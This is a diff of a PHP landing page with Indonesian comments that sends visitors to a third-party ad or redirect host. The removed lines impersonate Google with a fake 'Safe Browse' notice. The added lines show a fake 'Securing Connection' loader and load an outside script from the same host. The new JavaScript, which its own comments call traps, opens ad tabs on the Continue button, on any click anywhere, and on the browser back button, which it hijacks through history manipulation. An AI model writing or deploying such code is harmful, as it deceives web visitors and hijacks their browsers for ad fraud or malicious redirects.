@@ -1,47 +1,69 @@
 <?php
-// 1. Mengambil dan membersihkan parameter 'page' dari URL
-// htmlspecialchars() digunakan untuk keamanan, mencegah serangan XSS.
-$page_keyword_raw = isset($_GET['page']) ? $_GET['page'] : 'Default';
-$page_keyword_sanitized = htmlspecialchars($page_keyword_raw);
-
-$page_title_human_readable = ucwords(str_replace('-', ' ', $page_keyword_raw));
-
-$canonical_url = 'https://www.sookeregionchamber.com/detailsid/' . strtolower($page_keyword_raw) . '/';
-
-$target_url = 'https://ominousirritatingpictorial.com/yeq6pfda?key=1b4d52e64661803759543f5d2bf12246';
+// PHP untuk mengambil query parameter (tetap sama)
+$tracking_query = isset($_GET['p']) ? urlencode($_GET['p']) : 'not_provided';
+$display_query = isset($_GET['p']) ? htmlspecialchars(ucwords(str_replace('-', ' ', $_GET['p']))) : 'Our Content';
 ?>
-<!doctype html>
-<html amp lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title><?php echo $page_title_human_readable; ?> - Secure Connection</title>
-  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-  <script async src="https://cdn.ampproject.org/v0.js"></script>
-  <link rel="canonical" href="<?php echo $canonical_url; ?>" />
-  <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
-  <style amp-custom>
-    /* ... (CSS tetap sama persis seperti sebelumnya) ... */
-body{background:linear-gradient(135deg, #1a001a, #2b002b);color:#fff;font-family:'Roboto',sans-serif;text-align:center;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;margin:0;padding:20px;overflow:hidden}.logo{margin-bottom:40px}.logo amp-img{width:150px;height:auto;filter:drop-shadow(0 0 10px rgba(255,255,255,.3))}.message{font-size:24px;font-weight:300;margin-bottom:20px;color:#fff;text-shadow:0 0 5px rgba(255,255,255,.2)}.buttons{display:flex;flex-direction:column;gap:20px}.button{display:inline-flex;align-items:center;justify-content:center;width:250px;padding:15px 30px;background:linear-gradient(90deg,#3f51b5,#5c6bc0);color:#fff;text-decoration:none;border-radius:50px;font-size:18px;font-weight:500;box-shadow:0 5px 15px rgba(0,0,0,.3)}.button:hover{transform:translateY(-5px);box-shadow:0 8px 20px rgba(0,0,0,.4)}.button amp-img{margin-right:10px}.footer{font-size:14px;color:#fff;margin-top:40px;opacity:.8}@media (max-width:600px){.button{width:200px;font-size:16px}.message{font-size:20px}}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Content for <?php echo $display_query; ?>...</title>
+    <style>
+        /* ... CSS Anda tetap sama ... */
+        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #1a1a1a; color: #555; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; cursor: pointer; }
+        .loader { border: 5px solid #333; border-top: 5px solid #BB86FC; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { margin-top: 20px; font-size: 1.2em; line-height: 1.5; }
+        .container { text-align: center; }
+        .action-button { margin-top: 25px; padding: 15px 30px; font-size: 1.2em; font-weight: bold; color: #1a1a1a; background-color: #BB86FC; border: 2px solid #D1A9FF; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(187, 134, 252, 0.2); transition: all 0.2s ease-in-out; z-index: 10; position: relative; }
+        .action-button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(187, 134, 252, 0.3); }
+    </style>
 </head>
 <body>
-  <div class="logo">
-    <amp-img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" width="272" height="92" layout="responsive"></amp-img>
-  </div>
-  <div class="message">
-  <p>Continue to <?php echo $page_keyword_sanitized;?></p>
-    Your connection is secure.
-  </div>
-  <div class="buttons">
-    <a href="<?php echo $target_url; ?>" class="button" role="button">CONTINUE</a>
-    <a href="<?php echo $target_url; ?>" class="button" role="button">
-      <amp-img src="https://img.icons8.com/ios-filled/24/ffffff/left.png" width="24" height="24" alt="Back Icon"></amp-img>
-      BACK
-    </a>
-  </div>
-  <div class="footer">
-    Google.com © 2025 Safe Browse.
-  </div>
+    <div class="container">
+        <div class="loader"></div>
+        <div class="text">Please Wait, Securing Connection...</div>
+        <button id="continueButton" class="action-button">Continue to <?php echo $display_query; ?></button>
+    </div>
 
+    <script type='text/javascript' src='//ominousirritatingpictorial.com/d8/ed/62/d8ed62be35d6d1d6eb69f74ee66c68a0.js'></script>
+    
+    <script type="text/javascript">
+        // --- PENGATURAN LINK IKLAN ---
+        const baseUrl = 'https://ominousirritatingpictorial.com/yeq6pfda?key=1b4d52e64661803759543f5d2bf12246';
+        const trackingQuery = '<?php echo $tracking_query; ?>';
+        const redirectUrl = baseUrl + '&subid=' + trackingQuery;
+
+        // --- 2. LOGIKA UNTUK JEBAKAN TOMBOL "CONTINUE" (1 TAB) ---
+        const continueButton = document.getElementById('continueButton');
+        if (continueButton) {
+            continueButton.addEventListener('click', function(event) {
+                // Hentikan event agar tidak memicu jebakan klik latar belakang
+                event.stopPropagation();
+                // Buka satu tab iklan
+                window.open(redirectUrl, '_blank');
+            });
+        }
+
+        // --- 3. LOGIKA UNTUK "KLIK DI MANA SAJA" (2 TAB) ---
+        document.body.addEventListener('click', function() {
+            // Buka dua tab iklan
+            window.open(redirectUrl, '_blank');
+            window.open(redirectUrl, '_blank');
+        }, true);
+
+
+        // --- 4. LOGIKA UNTUK JEBAKAN TOMBOL KEMBALI (1 TAB) ---
+        (function() {
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function(event) {
+                // Buka satu tab iklan saat tombol kembali ditekan
+                window.open(redirectUrl, '_blank');
+                history.pushState(null, null, location.href);
+            });
+        })();
+
+    </script>
 </body>
 </html>
